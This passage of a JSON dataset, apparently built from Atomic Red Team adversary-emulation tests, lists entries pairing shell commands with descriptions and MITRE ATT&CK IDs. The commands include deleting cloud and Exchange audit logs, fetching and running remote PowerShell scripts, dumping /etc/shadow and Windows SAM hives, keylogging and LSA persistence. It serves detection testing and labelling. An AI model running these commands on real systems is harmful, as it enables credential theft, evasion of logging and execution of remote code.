        "Description": "Identifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "powershell"
    },
    {
        "ID": 516,
        "Command": "$secure_pwd = \"\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False\n",
        "Description": "You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "powershell"
    },
    {
        "ID": 517,
        "Command": "export AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1562.008/src\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n",
        "Description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "sh"
    },
    {
        "ID": 518,
        "Command": "export AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1562.008/src\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n",
        "Description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "sh"
    },
    {
        "ID": 519,
        "Command": "export AWS_REGION=us-west-2 \ncd $PathToAtomicsFolder/T1562.008/src\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.vpc-remove-flow-logs\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force\n",
        "Description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "sh"
    },
    {
        "ID": 520,
        "Command": "aws logs create-log-group --log-group-name log-test --region us-east-1 --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name log-test --region us-east-1 --output json\necho \"*** Log Group Deleted ***\"\n",
        "Description": "Creates a new cloudWatch log group in AWS, Upon successful creation it will Delete the group. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-group-deletion.html#aws-cloudwatch-log-group-deletion\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "sh"
    },
    {
        "ID": 521,
        "Command": "aws logs create-log-group --log-group-name test-logs --region us-west-2 --output json\necho \"*** Log Group Created ***\"\naws logs create-log-stream --log-group-name test-logs --log-stream-name 20150601\necho \"*** Log Stream Created ***\"\naws logs delete-log-stream --log-group-name test-logs --log-stream-name 20150601\necho \"*** Log Stream Deleted ***\"\naws logs delete-log-group --log-group-name test-logs --region us-west-2 --output json\necho \"*** Log Group Deleted ***\"\n",
        "Description": "Creates a new cloudWatch log stream in AWS, Upon successful creation it will Delete the stream. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-stream-deletion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "sh"
    },
    {
        "ID": 522,
        "Command": "$secure_pwd = \"o365_password_test\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"o365_user_test\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"o365_email_test\" -AuditBypassEnabled $true\n",
        "Description": "Use Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.\nhttps://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "powershell"
    },
    {
        "ID": 523,
        "Command": "gcloud config set project atomic-project-1\ngcloud logging logs delete projects/atomic-project-1/logs/cloudaudit.googleapis.com%2Factivity --quiet\n",
        "Description": "GCP provides 4 types of Cloud Audit Logs: Admin Activity, Data Access, System Events, and Policy Denied.\nAn adversary may attempt to delete logs in order to hide their activity. However, Admin Activity, System Events, and Policy Deny events logs cannot be deleted. \n\nThis Atomic attempts to delete the Activity Event log. An event is generated under the method name of `google.logging.v2.LoggingServiceV2.DeleteLog` with a Serverity of `ERROR`.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.008",
        "Shell": "sh"
    },
    {
        "ID": 524,
        "Command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n",
        "Description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1482",
        "Shell": "command_prompt"
    },
    {
        "ID": 525,
        "Command": "nltest /domain_trusts\nnltest /trusted_domains\n",
        "Description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1482",
        "Shell": "command_prompt"
    },
    {
        "ID": 526,
        "Command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n",
        "Description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1482",
        "Shell": "powershell"
    },
    {
        "ID": 527,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit) \n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1482",
        "Shell": "command_prompt"
    },
    {
        "ID": 528,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"  -gcb -sc trustdmp\n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1482",
        "Shell": "command_prompt"
    },
    {
        "ID": 529,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n",
        "Description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1482",
        "Shell": "powershell"
    },
    {
        "ID": 530,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\n",
        "Description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1482",
        "Shell": "powershell"
    },
    {
        "ID": 531,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" forest -n %userdomain%\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" domain -n %userdomain%\n",
        "Description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1482",
        "Shell": "command_prompt"
    },
    {
        "ID": 532,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\Security\\Level\" /t REG_DWORD /d 1 /f\nmkdir  %APPDATA%\\Microsoft\\Outlook\\ >nul 2>&1\necho \"Atomic Red Team TEST\" > %APPDATA%\\Microsoft\\Outlook\\VbaProject.OTM\n",
        "Description": "As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ \nit is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.\nToo achieve this two things must happened on the syste\n- The macro security registry value must be set to '4'\n- A file called VbaProject.OTM must be created in the Outlook Folder.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1137",
        "Shell": "command_prompt"
    },
    {
        "ID": 533,
        "Command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct\"\n",
        "Description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1216.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 534,
        "Command": "c:\\windows\\system32\\msiexec.exe /q /i \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi\"\n",
        "Description": "Executes an MSI containing embedded JScript code using msiexec.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 535,
        "Command": "c:\\windows\\system32\\msiexec.exe /q /i \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi\"\n",
        "Description": "Executes an MSI containing embedded VBScript code using msiexec.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 536,
        "Command": "c:\\windows\\system32\\msiexec.exe /q /i \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi\"\n",
        "Description": "Executes an MSI containing an embedded DLL using msiexec.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 537,
        "Command": "c:\\windows\\system32\\msiexec.exe /q /i \"PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi\"\n",
        "Description": "Executes an MSI containing an embedded EXE using msiexec.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 538,
        "Command": "Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_JScript.msi' }\n",
        "Description": "Executes an MSI containing embedded JScript code using the WMI Win32_Product class\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "powershell"
    },
    {
        "ID": 539,
        "Command": "Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_VBScript.msi' }\n",
        "Description": "Executes an MSI containing embedded VBScript code using the WMI Win32_Product class\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "powershell"
    },
    {
        "ID": 540,
        "Command": "Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_DLL.msi' }\n",
        "Description": "Executes an MSI containing an embedded DLL using the WMI Win32_Product class\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "powershell"
    },
    {
        "ID": 541,
        "Command": "Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\\T1218.007\\bin\\T1218.007_EXE.msi' }\n",
        "Description": "Executes an MSI containing an embedded EXE using the WMI Win32_Product class\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "powershell"
    },
    {
        "ID": 542,
        "Command": "c:\\windows\\system32\\msiexec.exe /y \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\"\n",
        "Description": "Loads a DLL into msiexec.exe and calls its DllRegisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 543,
        "Command": "c:\\windows\\system32\\msiexec.exe /z \"PathToAtomicsFolder\\T1218.007\\bin\\MSIRunner.dll\"\n",
        "Description": "Loads a DLL into msiexec.exe and calls its DllUnregisterServer function. Note: the DLL included in the \"bin\" folder is only built for 64-bit, so this won't work on a 32-bit OS.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 544,
        "Command": "c:\\windows\\system32\\msiexec.exe /q /i \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi\"\n",
        "Description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI executes a built-in JScript payload that launches powershell.exe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 545,
        "Command": "sudo cat /etc/shadow > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt\n",
        "Description": "/etc/shadow file is accessed in Linux environments\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.008",
        "Shell": "bash"
    },
    {
        "ID": 546,
        "Command": "sudo cat /etc/master.passwd > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt\n",
        "Description": "/etc/master.passwd file is accessed in FreeBSD environments\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.008",
        "Shell": "sh"
    },
    {
        "ID": 547,
        "Command": "cat /etc/passwd > /tmp/T1003.008.txt\ncat /tmp/T1003.008.txt\n",
        "Description": "/etc/passwd file is accessed in FreeBSD and Linux environments\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.008",
        "Shell": "sh"
    },
    {
        "ID": 548,
        "Command": "unamestr=$(uname)\nif [ \"$unamestr\" = 'Linux' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > /tmp/T1003.008.txt; elif [ \"$unamestr\" = 'FreeBSD' ]; then echo -e \"e /etc/passwd\\n,p\\ne /etc/master.passwd\\n,p\\ne /etc/shadow\\n,p\\n\" | ed > /tmp/T1003.008.txt; fi\n",
        "Description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using ed\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.008",
        "Shell": "sh"
    },
    {
        "ID": 549,
        "Command": "testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }\n[ \"$(uname)\" = 'FreeBSD' ] && testcat /etc/master.passwd\ntestcat /etc/passwd\ntestcat /etc/shadow\n",
        "Description": "Dump /etc/passwd, /etc/master.passwd and /etc/shadow using sh builtins\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.008",
        "Shell": "sh"
    },
    {
        "ID": 550,
        "Command": "reg save HKLM\\sam %temp%\\sam\nreg save HKLM\\system %temp%\\system\nreg save HKLM\\security %temp%\\security\n",
        "Description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated\nvia three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7\n\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 551,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_002\\Scripts\\pypykatz\" live lsa \n",
        "Description": "Parses registry hives to obtain stored credentials.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 552,
        "Command": "esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM\n",
        "Description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 553,
        "Command": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\"\nInvoke-PowerDump",
        "Description": "Executes a hashdump by reading the hashes from the registry.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.002",
        "Shell": "powershell"
    },
    {
        "ID": 554,
        "Command": "for /L %a in (1,1,10) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\SAM\" %temp%\\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\\SAMvss*\n",
        "Description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 555,
        "Command": "1..10 | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore\n}\n",
        "Description": "Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.002",
        "Shell": "powershell"
    },
    {
        "ID": 556,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsamfile -consoleoutput -noninteractive  ",
        "Description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.002",
        "Shell": "powershell"
    },
    {
        "ID": 557,
        "Command": "reg export HKLM\\sam %temp%\\sam\nreg export HKLM\\system %temp%\\system\nreg export HKLM\\security %temp%\\security\n",
        "Description": "Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior\nUpon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1003.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 558,
        "Command": "&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath $env:TEMP\\key.log\n",
        "Description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.001",
        "Shell": "powershell"
    },
    {
        "ID": 559,
        "Command": "if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \"session\\trequired\\tpam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session\\trequired\\tpam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/system-auth\n",
        "Description": "Pluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.001",
        "Shell": "sh"
    },
    {
        "ID": 560,
        "Command": "PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n",
        "Description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.001",
        "Shell": "sh"
    },
    {
        "ID": 561,
        "Command": "PS2=`logger -t \"$USER\" -f ~/.sh_history`\n$PS2\ntail /var/log/messages\n",
        "Description": "There are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .shrc or .profile \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.001",
        "Shell": "sh"
    },
    {
        "ID": 562,
        "Command": "trap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> /tmp/.keyboard.log' DEBUG\necho \"Hello World!\"\ncat /tmp/.keyboard.log\n",
        "Description": "When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.001",
        "Shell": "bash"
    },
    {
        "ID": 563,
        "Command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh ubuntu@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n",
        "Description": "Linux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.001",
        "Shell": "sh"
    },
    {
        "ID": 564,
        "Command": "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start now\n",
        "Description": "The linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.001",
        "Shell": "sh"
    },
    {
        "ID": 565,
        "Command": "swift PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift -keylog\n",
        "Description": "Utilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1056.001",
        "Shell": "bash"
    },
    {
        "ID": 566,
        "Command": "Copy-Item \"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll\" C:\\Windows\\System32\\\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"Authentication Packages\" /t REG_MULTI_SZ /d \"msv1_0\\0package.dll\" /f\n",
        "Description": "Establishes persistence using a custom authentication package for the Local Security Authority (LSA).\nAfter a reboot, Notepad.exe will be executed as child process of lsass.exe.\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n[Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.002",
        "Shell": "powershell"
    },
    {
        "ID": 567,
        "Command": "driverquery /v /fo list\ndriverquery /si /fo list\n",
        "Description": "Displays a list of installed device drivers on the local computer and their properties. Threat actors use this command to enumerate the existing drivers on the computer. \nParameters: \n/v /fo list - Displays verbose output in a list format - the /v parameter is not valid for signed drivers\n/si /fo list - Provides information about signed drivers and outputs it in a list format\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1652",
        "Shell": "powershell"
    },
    {
        "ID": 568,
        "Command": "dir /s c:\\ >> %temp%\\T1083Test1.txt\ndir /s \"c:\\Documents and Settings\" >> %temp%\\T1083Test1.txt\ndir /s \"c:\\Program Files\\\" >> %temp%\\T1083Test1.txt\ndir \"%systemdrive%\\Users\\*.*\" >> %temp%\\T1083Test1.txt\ndir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\T1083Test1.txt\ndir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\T1083Test1.txt\ntree /F >> %temp%\\T1083Test1.txt\n",
        "Description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1083",
        "Shell": "command_prompt"
    },
    {
        "ID": 569,
        "Command": "ls -recurse\nget-childitem -recurse\ngci -recurse\n",
        "Description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1083",
        "Shell": "powershell"
    },
    {
        "ID": 570,
